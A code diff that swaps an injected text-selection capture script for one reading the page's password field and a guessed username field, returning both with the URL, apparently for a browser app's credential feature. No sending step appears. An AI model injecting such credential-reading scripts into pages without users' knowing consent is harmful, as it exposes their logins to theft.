@@ -1,31 +1,23 @@
 export const CAPTURE_CREDENTIAL_SCRIPT = `(() => {
-          if (window.__minusSelectionCaptureMounted) return;
+          if (window.__minusSelectionCaptureMounted) return null;
           window.__minusSelectionCaptureMounted = true;
-          if (!window.__minusSelectionAnchor) {
-            window.__minusSelectionAnchor = null;
-          }
-          document.addEventListener("mousemove", (event) => {
-            window.__minusSelectionAnchor = { x: event.clientX, y: event.clientY };
-          }, true);
-          const notify = () => {
-            const text = String(window.getSelection?.()?.toString?.() || "").trim().slice(0, 4000);
-            if (!text) return;
-            try {
-              const selection = window.getSelection?.();
-              const range = selection && selection.rangeCount > 0 ? selection.getRangeAt(0) : null;
-              if (range) {
-                const rect = range.getBoundingClientRect();
-                window.__minusSelectionAnchor = { x: rect.left, y: rect.bottom };
-              }
-            } catch (error) {}
-            console.log("__MINUS_SELECTION_CAPTURE__:" + JSON.stringify({
-              text,
-              url: window.location.href,
-              anchor: window.__minusSelectionAnchor || null
-            }));
+          const pwdInput = document.querySelector('input[type="password"]');
+          if (!pwdInput) return null;
+          const password = pwdInput.value;
+          if (!password) return null;
+          const usernameSelectors = [
+            'input[type="email"]',
+            'input[name*="user" i]', 'input[name*="email" i]',
+            'input[id*="user" i]', 'input[id*="email" i]',
+            'input:not([type="password"])'
+          ];
+          const userInput = usernameSelectors
+            .map(function(s) { return document.querySelector(s); })
+            .find(function(el) { return Boolean(el); });
+          const username = userInput ? userInput.value : '';
+          return {
+            username: username,
+            password: password,
+            url: window.location.href
           };
-          document.addEventListener("selectionchange", () => {
-            clearTimeout(window.__minusSelectionCaptureTimer);
-            window.__minusSelectionCaptureTimer = setTimeout(notify, 120);
-          });
         })();`;
